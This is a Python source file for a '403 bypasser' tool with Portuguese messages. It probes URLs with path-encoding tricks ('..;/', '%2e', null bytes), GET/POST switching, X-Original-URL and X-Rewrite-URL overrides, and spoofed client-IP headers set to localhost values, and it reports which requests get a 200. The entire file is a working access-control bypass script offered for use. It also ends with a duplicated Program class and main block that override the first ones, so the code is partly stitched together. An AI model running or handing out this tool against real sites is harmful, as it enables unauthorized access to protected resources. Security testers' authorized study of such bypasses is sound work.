import requests
import sys
import argparse
import validators
import os
from urllib.parse import urlparse
from colorama import init, Fore, Style
from pyfiglet import Figlet

# INITIALISE COLORAMA
init()

# DISPLAY BANNER
custom_fig = Figlet(font='slant')
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('403bypasser') + Style.RESET_ALL)
print(Fore.GREEN + Style.BRIGHT + "____________________ Ghost ____________________\n")
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)

# ARGUMENTS
parser = argparse.ArgumentParser(
    description='403 Bypasser: use -u for single URL or --targets for a file of URLs (one per line)'
)
parser.add_argument('-u', '--url', dest='url', type=str,
                    help='Single URL to test, e.g. http://example.com/secret')
parser.add_argument('-U', '--targets', dest='targets', type=str,
                    help='Path to file with list of URLs, e.g. targets.txt')
args = parser.parse_args()

class Arguments():
    def __init__(self, url, targets):
        self.urls = []
        self.url = url
        self.targets = targets
        self._collect_urls()

    def _collect_urls(self):
        if self.url:
            if not validators.url(self.url):
                print(Fore.RED + "URL inválida para -u/--url!" + Style.RESET_ALL)
                sys.exit(1)
            self.urls.append(self.url.rstrip('/'))
        elif self.targets:
            if not os.path.exists(self.targets):
                print(Fore.RED + "Arquivo de URLs não encontrado!" + Style.RESET_ALL)
                sys.exit(1)
            with open(self.targets, 'r') as f:
                for line in f:
                    u = line.strip()
                    if u and validators.url(u):
                        self.urls.append(u.rstrip('/'))
        else:
            print(Fore.YELLOW + "Forneça -u (URL única) ou --targets (arquivo de URLs)." + Style.RESET_ALL)
            sys.exit(1)

    def get_urls(self):
        return self.urls

class PathRepository():
    def __init__(self, element):
        self.base = element
        self.variations = []
        self._build()

    def _build(self):
        el = self.base
        self.variations.append(el)
        pairs = [["/", "//"], ["/.", "/./"]]
        leadings = ["/%2e"]
        trailings = [
            "/", "..;/", "/..;/", "%20", "%09", "%00", ".json",
            ".css", ".html", "?", "??", "???", "?testparam", "#",
            "#test", "/.", "//", "/./"
        ]
        for a, b in pairs:
            self.variations.append(a + el + b)
        for l in leadings:
            self.variations.append(l + el)
        for t in trailings:
            self.variations.append(el + t)

class Query():
    def __init__(self, base_url, element):
        self.base_url = base_url
        self.element = element
        self.repo = PathRepository(element)
        self.headers_override = {
            'X-Original-URL': element,
            'X-Rewrite-URL': element
        }
        self.other_headers = [
            'X-Custom-IP-Authorization', 'X-Forwarded-For', 'X-Forward-For',
            'X-Remote-IP', 'X-Originating-IP', 'X-Remote-Addr',
            'X-Client-IP', 'X-Real-IP'
        ]
        self.values = [
            'localhost', 'localhost:80', 'localhost:443', '127.0.0.1',
            '127.0.0.1:80', '127.0.0.1:443', '2130706433', '0x7F000001',
            '0177.0000.0000.0001', '0', '127.1', '10.0.0.0', '10.0.0.1',
            '172.16.0.0', '172.16.0.1', '192.168.1.0', '192.168.1.1'
        ]

    def run_bypass(self):
        successes = []
        # Path & Method Manipulation
        for var in self.repo.variations:
            for method in ('GET', 'POST'):
                try:
                    if method == 'GET':
                        r = requests.get(self.base_url + var, allow_redirects=False, timeout=10)
                    else:
                        r = requests.post(self.base_url + var, allow_redirects=False, timeout=10)
                    code = r.status_code
                except Exception:
                    continue
                mark = Fore.GREEN + '✔' + Style.RESET_ALL if code == 200 else Fore.MAGENTA + '✖' + Style.RESET_ALL
                print(f"{mark} {method} {self.base_url + var} -> {code}")
                if code == 200:
                    successes.append((method, self.base_url + var, code))
        # Override non-standard headers
        for hdr, val in self.headers_override.items():
            try:
                r = requests.get(self.base_url, headers={hdr: val}, allow_redirects=False, timeout=10)
                code = r.status_code
            except Exception:
                continue
            mark = Fore.GREEN + '✔' + Style.RESET_ALL if code == 200 else Fore.MAGENTA + '✖' + Style.RESET_ALL
            print(f"{mark} GET {self.base_url} [{hdr}: {val}] -> {code}")
            if code == 200:
                successes.append((f"HEADER_OVERRIDE", f"{hdr}: {val}", code))
        # Other header injection
        for hdr in self.other_headers:
            for val in self.values:
                try:
                    r = requests.get(self.base_url + self.element, headers={hdr: val}, allow_redirects=False, timeout=10)
                    code = r.status_code
                except Exception:
                    continue
                mark = Fore.GREEN + '✔' + Style.RESET_ALL if code == 200 else Fore.MAGENTA + '✖' + Style.RESET_ALL
                print(f"{mark} GET {self.base_url + self.element} [{hdr}: {val}] -> {code}")
                if code == 200:
                    successes.append((f"HEADER_INJECT", f"{hdr}: {val}", code))
        return successes

class Program():
    def __init__(self, urls):
        self.urls = urls

    def initialise(self):
        all_successes = []
        for u in self.urls:
            parsed = urlparse(u)
            path = parsed.path or "/"
            segments = [seg for seg in path.split('/') if seg]
            if not segments:
                print(Fore.YELLOW + f"Aviso: URL sem segmento final: {u}, pulando." + Style.RESET_ALL)
                continue
            last = segments[-1]
            prefix = "/" + "/".join(segments[:-1]) if len(segments) > 1 else ""
            base = f"{parsed.scheme}://{parsed.netloc}{prefix}"
            element = "/" + last
            q = Query(base, element)
            successes = q.run_bypass()
            for s in successes:
                all_successes.append((u, *s))
        return all_successes

if __name__ == "__main__":
    args_obj = Arguments(args.url, args.targets)
    prog = Program(args_obj.get_urls())
    results = prog.initialise()
    if args.targets:
        if results:
            print(Fore.GREEN + "\n=== Resumo de bypasses bem-sucedidos ===" + Style.RESET_ALL)
            for orig_url, method, detail, code in results:
                print(f"{orig_url} via {method} {detail} -> {code}")
        else:
            print(Fore.RED + "\n[-] Nenhum método de bypass retornou 200 para as URLs fornecidas." + Style.RESET_ALL)

class Program():
    def __init__(self, urls):
        self.urls = urls

    def initialise(self):
        for u in self.urls:
            parsed = urlparse(u)
            path = parsed.path or "/"
            segments = [seg for seg in path.split('/') if seg]
            if not segments:
                print(Fore.YELLOW + f"Aviso: URL sem segmento final: {u}, pulando." + Style.RESET_ALL)
                continue

            last = segments[-1]
            prefix = "/" + "/".join(segments[:-1]) if len(segments) > 1 else ""
            base = f"{parsed.scheme}://{parsed.netloc}{prefix}"
            element = "/" + last

            q = Query(base, element)
            q.run_bypass()

if __name__ == "__main__":
    args_obj = Arguments(args.url, args.targets)
    prog = Program(args_obj.get_urls())
    prog.initialise()
